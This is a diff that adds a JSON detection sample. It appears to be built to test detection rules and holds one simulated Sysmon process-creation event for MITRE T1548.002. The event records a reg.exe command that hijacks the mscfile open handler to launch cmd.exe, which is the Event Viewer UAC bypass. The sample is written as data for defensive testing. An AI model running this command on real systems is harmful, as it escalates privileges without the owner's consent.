@@ -1,0 +1,36 @@
+{
+  "metadata": {
+    "source": "DetectForge-Curated-Sample",
+    "technique_id": "T1548.002",
+    "normalized_by": "DetectForge-FetchReferenceSamples",
+    "placeholder": false,
+    "source_ref": "Atomic Red Team T1548.002 test 'Bypass UAC using Event Viewer (cmd)' (GUID 5073adf8-9a50-4bd9-b298-a9bd2ead8af9) - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md"
+  },
+  "event": {
+    "EventID": 1,
+    "Channel": "Microsoft-Windows-Sysmon/Operational",
+    "Provider_Name": "Microsoft-Windows-Sysmon",
+    "TimeCreated": "2026-08-12T20:14:22.117000Z",
+    "Computer": "WORKSTATION05.CORP.LOCAL",
+    "Security": {
+      "UserID": "S-1-5-21-123456789-987654321-1004"
+    },
+    "EventData": {
+      "UtcTime": "2026-08-12 20:14:22.117",
+      "ProcessGuid": "{B2345678-9ABC-DEF0-0000-001000000014}",
+      "ProcessId": 6220,
+      "Image": "C:\\Windows\\System32\\reg.exe",
+      "CommandLine": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f",
+      "CurrentDirectory": "C:\\Users\\victim3\\",
+      "User": "CORP\\victim3",
+      "LogonGuid": "{B2345678-9ABC-DEF0-0000-002000000012}",
+      "LogonId": "0x5b2",
+      "TerminalSessionId": 1,
+      "IntegrityLevel": "Medium",
+      "ParentProcessGuid": "{B2345678-9ABC-DEF0-0000-001000000007}",
+      "ParentProcessId": 3120,
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "cmd.exe"
+    }
+  }
+}
